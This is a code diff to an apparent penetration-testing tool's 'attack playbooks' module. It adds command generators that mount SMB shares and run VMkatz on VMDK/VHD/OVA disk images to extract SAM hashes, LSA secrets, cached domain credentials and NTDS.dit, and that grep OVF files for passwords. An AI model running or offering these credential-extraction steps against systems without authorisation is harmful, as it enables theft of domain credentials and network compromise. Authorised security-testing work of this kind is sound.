@@ -1,6 +1,6 @@
 import { FileResult, ShareInfo } from '../types';
 import { RATING_ORDER, Severity } from './constants';
-import { generateSmbclientCmd, parseUNCPath, type ParsedPath } from './commandGenerator';
+import { generateMountCmd, generateSmbclientCmd, parseUNCPath, type ParsedPath } from './commandGenerator';
 
 export type AttackCategory =
   | 'credentials'
@@ -31,6 +31,16 @@ export const ATTACK_CATEGORY_ICONS: Record<AttackCategory | 'all', string> = {
   cloud: 'fa-cloud',
   configs: 'fa-cog',
 };
+
+export type AttackTool = string | { name: string; url: string };
+
+export function attackToolName(tool: AttackTool): string {
+  return typeof tool === 'string' ? tool : tool.name;
+}
+
+export function attackToolUrl(tool: AttackTool): string | undefined {
+  return typeof tool === 'string' ? undefined : tool.url;
+}
 
 export interface AttackCommand {
   label: string;
@@ -66,7 +76,7 @@ export interface AttackPlaybookDef {
   summary: string;
   why: string;
   nextSteps: string[];
-  tools: string[];
+  tools: AttackTool[];
   severity: Severity;
   category: AttackCategory;
   icon: string;
@@ -845,38 +855,95 @@ export const ATTACK_PLAYBOOKS: AttackPlaybookDef[] = [
   {
     id: 'vmdk-vhd',
     title: 'Extract secrets from disk images',
-    summary: 'VMDK/VHD often contain SAM, NTDS, or SSH keys',
-    why: 'Virtual disk images on shares are full filesystems. Mount them read-only and loot SAM/SYSTEM, NTDS.dit, unattend files, SSH keys, and browser profiles.',
+    summary: 'Run VMkatz on a mounted share — do not download the disk',
+    why: 'VMDK/VHD/VHDX files on shares are often tens or hundreds of gigabytes, so copying them locally is rarely practical. Mount the share and run VMkatz against the image in place to pull SAM hashes, LSA secrets, cached domain creds, DPAPI keys, and NTDS.dit without exfiltrating the disk.',
     nextSteps: [
-      'Download or loop-mount the image read-only',
-      'Hunt Windows\\System32\\config, NTDS, and user profiles',
-      'Dump hashes with secretsdump / pypykatz',
+      'Mount the file share read-only (CIFS) instead of downloading the image',
+      'Point VMkatz at the VMDK/VHD on the mount — it reads SAM/LSA/NTDS in place',
+      'If the folder also has .vmsn/.vmem snapshots, run VMkatz on those for live credentials',
     ],
-    tools: ['guestmount', '7z', 'qemu-nbd', 'impacket-secretsdump'],
+    tools: [{ name: 'vmkatz', url: 'https://github.com/nikaiw/VMkatz' }, 'mount.cifs'],
     severity: 'critical',
     category: 'disks',
     icon: 'fa-hdd',
     source: 'files',
-    matcher: { extensions: ['vmdk', 'vhd', 'vhdx', 'ova', 'ovf', 'qcow2', 'vdi'] },
+    matcher: { extensions: ['vmdk', 'vhd', 'vhdx', 'qcow2', 'vdi'] },
     resultsFilter: { type: 'extension', value: 'vmdk' },
-    buildCommands: (ctx) =>
-      withDownload(ctx, [
+    buildCommands: (ctx) => {
+      const mounted = ctx.parsed
+        ? `/mnt/share/${ctx.linuxPath}`
+        : `/mnt/share/${ctx.localName}`;
+      const commands: AttackCommand[] = [];
+      if (ctx.parsed) {
+        commands.push({
+          label: 'Mount the share (read-only)',
+          description: 'Keep the VMDK on the file server; do not copy it locally',
+          command: `sudo mkdir -p /mnt/share\n${generateMountCmd(ctx.parsed)},ro`,
+        });
+      }
+      commands.push(
         {
-          label: 'List image contents',
-          description: 'Quick peek without a full mount (works on many VMDK/OVA)',
-          command: `7z l ${shQuote(ctx.localName)}`,
+          label: 'VMkatz (disk in place)',
+          description: 'Extract SAM / LSA / cached creds from the mounted image',
+          command: `./vmkatz ${shQuote(mounted)}`,
         },
         {
-          label: 'Mount read-only',
-          description: 'libguestfs mount of the guest filesystem',
-          command: `sudo mkdir -p /mnt/guest\nsudo guestmount -a ${shQuote(ctx.localName)} -i --ro /mnt/guest`,
+          label: 'VMkatz NTDS (if a DC disk)',
+          description: 'Dump AD hashes from ntds.dit inside the image',
+          command: `./vmkatz --ntds ${shQuote(mounted)}`,
+        }
+      );
+      return commands;
+    },
+  },
+  {
+    id: 'ova-ovf',
+    title: 'Unpack OVA / OVF then run VMkatz',
+    summary: 'OVA is a tar archive — extract the nested VMDK first',
+    why: 'VMkatz cannot read .ova directly. An OVA is a tar of an OVF descriptor plus one or more VMDKs. Mount the share, list the archive, pull out only the disk, then run VMkatz on that VMDK. A standalone .ovf is XML metadata: loot any embedded passwords and point VMkatz at the sibling .vmdk it references.',
+    nextSteps: [
+      'Mount the share read-only — do not copy the whole OVA locally',
+      'List the archive and extract only the nested .vmdk (that is what VMkatz can parse)',
+      'For .ovf, read the XML for credentials and run VMkatz on the referenced disk in the same folder',
+    ],
+    tools: [{ name: 'vmkatz', url: 'https://github.com/nikaiw/VMkatz' }, 'tar', '7z', 'mount.cifs'],
+    severity: 'critical',
+    category: 'disks',
+    icon: 'fa-box',
+    source: 'files',
+    matcher: { extensions: ['ova', 'ovf'] },
+    resultsFilter: { type: 'extension', value: ['ova', 'ovf'] },
+    buildCommands: (ctx) => {
+      const mounted = ctx.parsed
+        ? `/mnt/share/${ctx.linuxPath}`
+        : `/mnt/share/${ctx.localName}`;
+      const commands: AttackCommand[] = [];
+      if (ctx.parsed) {
+        commands.push({
+          label: 'Mount the share (read-only)',
+          description: 'Work against the OVA on the file server',
+          command: `sudo mkdir -p /mnt/share\n${generateMountCmd(ctx.parsed)},ro`,
+        });
+      }
+      commands.push(
+        {
+          label: 'List OVA contents',
+          description: 'Find the nested VMDK name without unpacking everything',
+          command: `tar -tf ${shQuote(mounted)}\n# or\n7z l ${shQuote(mounted)}`,
         },
         {
-          label: 'Dump local hashes',
-          description: 'After copying SAM + SYSTEM out of the image',
-          command: `impacket-secretsdump -sam SAM -system SYSTEM LOCAL`,
+          label: 'Extract nested VMDK, then VMkatz',
+          description: 'Pull only the disk out of the tar, then extract secrets',
+          command: `mkdir -p /tmp/ova_out\ntar -xf ${shQuote(mounted)} -C /tmp/ova_out --wildcards '*.vmdk'\n./vmkatz /tmp/ova_out/*.vmdk`,
         },
-      ]),
+        {
+          label: 'Read OVF descriptor',
+          description: 'If this is .ovf, hunt passwords and the referenced disk filename',
+          command: `grep -n -i -E 'password|ovf:href|vmdk|user' ${shQuote(mounted)}`,
+        }
+      );
+      return commands;
+    },
   },
   {
     id: 'iso-wim',
@@ -1177,7 +1244,21 @@ export const ATTACK_PLAYBOOKS: AttackPlaybookDef[] = [
       custom: (file) => {
         const name = lowerName(file);
         const ext = extensionOf(file.fileName);
-        return ext === 'ovpn' || ext === 'pcf' || name.endsWith('.pbk') || name.includes('vpn');
+        if (ext === 'ovpn' || ext === 'pcf' || ext === 'pbk') return true;
+        // Filename contains "vpn" but is not a profile (certs, pcaps, disks, etc.)
+        const notAProfile = new Set([
+          'p12', 'pfx', 'pem', 'crt', 'cer', 'key', 'pcap', 'pcapng', 'cap',
+          'exe', 'dll', 'zip', '7z', 'vmdk', 'ova', 'iso', 'log', 'txt',
+        ]);
+        if (notAProfile.has(ext)) return false;
+        const looksLikeClient =
+          name.includes('openvpn') ||
+          name.includes('anyconnect') ||
+          name.includes('globalprotect') ||
+          name.includes('wireguard') ||
+          name.includes('forticlient');
+        const configExt = ext === 'conf' || ext === 'config' || ext === 'xml' || ext === 'json' || ext === 'tblk';
+        return looksLikeClient || (name.includes('vpn') && configExt);
       },
     },
     resultsFilter: { type: 'extension', value: 'ovpn' },
